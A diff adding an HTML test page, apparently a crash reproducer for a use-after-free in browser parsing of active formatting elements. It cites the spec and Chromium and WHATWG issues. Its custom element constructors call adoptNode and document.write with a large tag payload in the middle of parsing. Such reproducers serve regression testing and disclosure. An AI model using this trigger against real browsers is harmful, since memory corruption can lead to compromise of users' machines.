@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Use-After-Free in reconstructing the active formatting elements via custom element reallocation</title>
+<link rel="help" href="https://html.spec.whatwg.org/multipage/parsing.html#reconstruct-the-active-formatting-elements">
+<link rel="help" href="https://issues.chromium.org/issues/496298136">
+<link rel="help" href="https://github.com/whatwg/html/issues/12327">
+</head>
+<body>
+<iframe id="target-frame"></iframe>
+<div id="wrapper">
+    <p>
+        <b is="custom-a"></b>
+        <b is="custom-b"></b>
+    </p>
+</div>
+<script>
+    let isReconstructing = false;
+    window.payload = "";
+    for (let i = 0; i < 10000; i++) {
+        window.payload += `<b attr="${i}">`;
+    }
+
+    class CustomA extends HTMLElement {
+        constructor() {
+            super();
+            if (isReconstructing) {
+                try {
+                    let wrapper = document.getElementById('wrapper');
+                    let frame = document.getElementById('target-frame');
+                    frame.contentDocument.adoptNode(wrapper);
+                } catch(e) { }
+            }
+        }
+    }
+
+    class CustomB extends HTMLElement {
+        constructor() {
+            super();
+            if (isReconstructing) {
+                try {
+                    document.write(window.payload);
+                } catch(e) { }
+            }
+        }
+    }
+
+    customElements.define('custom-a', CustomA, { extends: 'b' });
+    customElements.define('custom-b', CustomB, { extends: 'b' });
+
+    document.write('<div id="real-wrapper"><p><b is="custom-a"><b is="custom-b"><div></div></div>');
+
+    isReconstructing = true;
+    document.write('<span>TRIGGER</span>');
+</script>
+</body>
+</html>
